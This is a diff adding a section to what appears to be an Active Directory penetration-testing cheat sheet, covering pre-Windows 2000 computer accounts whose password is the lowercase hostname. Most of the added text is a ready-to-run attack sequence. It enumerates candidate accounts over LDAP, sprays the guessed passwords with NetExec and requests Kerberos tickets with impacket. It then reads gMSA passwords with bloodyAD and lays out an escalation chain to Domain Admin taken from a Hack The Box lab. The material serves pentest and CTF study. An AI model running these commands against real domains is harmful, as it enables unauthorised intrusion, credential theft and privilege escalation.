@@ -105,6 +105,81 @@ impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass
 hashcat -m 18200 asrep.txt rockyou.txt
 ```
 
+### Pre-Windows 2000 Compatible Access (Pre2k)
+
+**What it is:** Legacy backward-compatibility configuration where computer accounts are created with **"Assign this computer account as a pre-Windows 2000 computer"** enabled. Instead of a random machine password managed by Kerberos, the password defaults to the **lowercase sAMAccountName without the trailing `$`**.
+
+**Why it exists:** Maintained compatibility with NT 4.0 and older clients that needed simpler authentication. Still found in:
+- Lab/CTF environments (intentional weak config)
+- Aged enterprise networks with pre-2000 migration artifacts never cleaned up
+- Domains where administrators use the legacy "pre-Windows 2000 computer" checkbox during computer object creation
+
+**Indicators (check these FIRST before attempting):**
+- Computer account in `Pre-Windows 2000 Compatible Access` group (check group membership via BloodHound or LDAP)
+- Computer has **no SPNs** registered (unusual — real Windows hosts always have `HOST/`, `RestrictedKrbHost/`, etc.)
+- Computer object **absent from BloodHound attack-path edges** (no delegation, no ACL inbound/outbound, "orphaned" appearance)
+- `pwdLastSet` timestamp unchanged since `whenCreated` (password never rotated)
+- `userAccountControl` includes flag `4128` (WORKSTATION_TRUST_ACCOUNT + PASSWD_NOTREQD) and `logonCount=0` (never logged on)
+
+**Example:** Computer `FS01$` → default password = `fs01` (lowercase, no `$`)
+
+```bash
+# 1. Identify pre2k candidates via LDAP (authenticated or anonymous if allowed)
+ldapsearch -x -H ldap://dc.corp.local -D 'user@corp.local' -w 'password' \
+  -b 'DC=corp,DC=local' \
+  '(&(userAccountControl=4128)(logonCount=0))' sAMAccountName | grep sAMAccountName
+
+# Alternatively: check "Pre-Windows 2000 Compatible Access" group members
+ldapsearch -x -H ldap://dc.corp.local -D 'user@corp.local' -w 'password' \
+  -b 'CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=corp,DC=local' member
+
+# 2. Generate password wordlist (lowercase sAMAccountName without $)
+cat computers.txt | tr '[:upper:]' '[:lower:]' | sed 's/\$$//' > passwords.txt
+
+# 3. Test with NetExec (line-by-line, no-bruteforce mode)
+nxc smb dc.corp.local -u computers.txt -p passwords.txt --no-bruteforce -k
+
+# 4. Request TGT for valid credential (sync time first — Kerberos <5min skew)
+sudo ntpdate dc-ip
+impacket-getTGT 'corp.local/COMPUTERNAME$:lowercasehostname' -dc-ip dc-ip
+export KRB5CCNAME=COMPUTERNAME\$.ccache
+klist  # verify ticket
+
+# Automated tool: pre2k by garrettfoster13
+pipx install git+https://github.com/garrettfoster13/pre2k
+pre2k unauth -d corp.local -dc-ip dc-ip -inputfile computers.txt -save
+```
+
+**Post-compromise with pre2k computer account:**
+
+Once you have a privileged computer account TGT, enumerate what it can access:
+
+```bash
+# Check group memberships (common: Domain Computers grants ReadGMSAPassword on gMSAs)
+ldapsearch -Q -Y GSSAPI -H ldap://dc.corp.local \
+  -b 'DC=corp,DC=local' "(sAMAccountName=COMPUTERNAME$)" memberOf
+
+# Extract gMSA password if ReadGMSAPassword ACE exists
+KRB5CCNAME=COMPUTERNAME$.ccache \
+  bloodyAD --host dc.corp.local --dc-ip dc-ip -d corp.local -u 'COMPUTERNAME$' -k \
+  get object 'gMSA_account$' --attr msDS-ManagedPassword
+
+# Typical escalation: gMSA → WinRM/SMB as service account → further ACL abuse
+impacket-getTGT corp.local/gMSA_account$ -hashes :ntlm_hash -dc-ip dc-ip
+```
+
+**Common attack chains seen in HTB Vintage:**
+1. Pre2k computer (`FS01$:fs01`) → ReadGMSAPassword on `gMSA01$` (via Domain Computers group)
+2. gMSA account → AddSelf/GenericWrite on ServiceManagers group
+3. ServiceManagers → GenericAll on service accounts → targeted Kerberoast
+4. Cracked service account → lateral movement → RBCD → DA
+
+**References:**
+- [HTB Vintage writeup (0xBEN)](https://benheater.com/hackthebox-vintage/) — Full pre2k → gMSA → DA chain
+- [HTB Vintage writeup (InfoSec)](https://infosecwriteups.com/htb-vintage-machine-walkthrough-easy-hackthebox-guide-for-beginners-c39008aa3e16) — Step-by-step with bloodyAD
+- [The Hacker Recipes: Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers) — Detection & exploitation
+- [Semperis: Pre-Windows 2000 Compatibility Risks](https://www.semperis.com/blog/security-risks-pre-windows-2000-compatibility-windows-2022/) — Enterprise impact
+
 ### LSASS / SAM Dumping
 
 ```cmd
